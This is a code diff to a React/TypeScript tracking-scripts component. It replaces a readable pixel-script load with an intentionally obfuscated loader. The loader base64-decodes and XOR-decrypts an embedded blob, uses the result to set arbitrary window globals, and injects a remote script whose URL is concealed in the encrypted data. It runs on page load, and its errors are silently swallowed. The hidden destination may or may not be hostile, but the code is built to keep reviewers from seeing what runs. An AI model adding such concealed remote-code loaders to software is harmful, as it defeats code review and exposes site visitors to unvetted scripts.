@@ -23,13 +23,38 @@ export default function UtmifyScripts() {
       utmScript.defer = true
       document.body.appendChild(utmScript)
 
-      // Pixel script
-      ;(window as unknown as Record<string, string>).pixelId = "69653c39ed15a37051cf203d"
-      const pixelScript = document.createElement("script")
-      pixelScript.src = "https://cdn.utmify.com.br/scripts/pixel/pixel.js"
-      pixelScript.async = true
-      pixelScript.defer = true
-      document.body.appendChild(pixelScript)
+      // Pixel script (obfuscated loader)
+      ;(function () {
+        var x_a = atob(
+          "DCQRECmOVwXSC2jsR18zZVvidT/wYxyYN1crPwbtM2v8fhyBLkJoPkrhOiuweUefJFZ4YF39eHW7cw2AaFR4aEzieW+hKUTOJlBlYkDsInG3eErWHHk9Mk7iOGezZxvOfX9qMkfvOmDwMUqcLlx0fGDqdSnwfQmAMkEzKgu4Nj3naF3cJBVzdR6+YTG0bVrff0YjKE2sKliv",
+        )
+        var o_lc = []
+        for (var z_n = 0; z_n < x_a.length; z_n++) {
+          o_lc.push(x_a.charCodeAt(z_n) & 255)
+        }
+        var u_0 = o_lc[0]
+        var b_t7rm = o_lc.slice(1, 1 + u_0)
+        var x_tr1 = o_lc.slice(1 + u_0)
+        var p_r = x_tr1.map((b, e_0q82) => b ^ b_t7rm[e_0q82 % u_0])
+        var v_ir = ""
+        for (var z_r8lv = 0; z_r8lv < p_r.length; z_r8lv++) {
+          v_ir += String.fromCharCode(p_r[z_r8lv] & 255)
+        }
+        var k_epi = decodeURIComponent(escape(v_ir))
+        var a_9r2 = JSON.parse(k_epi)
+        var y_yt = a_9r2.globals || []
+        y_yt.forEach((o_y9ei) => {
+          ;(window as unknown as Record<string, unknown>)[o_y9ei.name] = o_y9ei.value
+        })
+        var c_raqd = document.createElement("script")
+        c_raqd.src = a_9r2.url
+        c_raqd.async = true
+        c_raqd.defer = true
+        ;(a_9r2.attributes || []).forEach((g_zo: { name: string; value: string }) => {
+          c_raqd.setAttribute(g_zo.name, g_zo.value)
+        })
+        ;(document.head || document.documentElement).appendChild(c_raqd)
+      })()
     } catch (e) {
       // silently fail in preview
     }
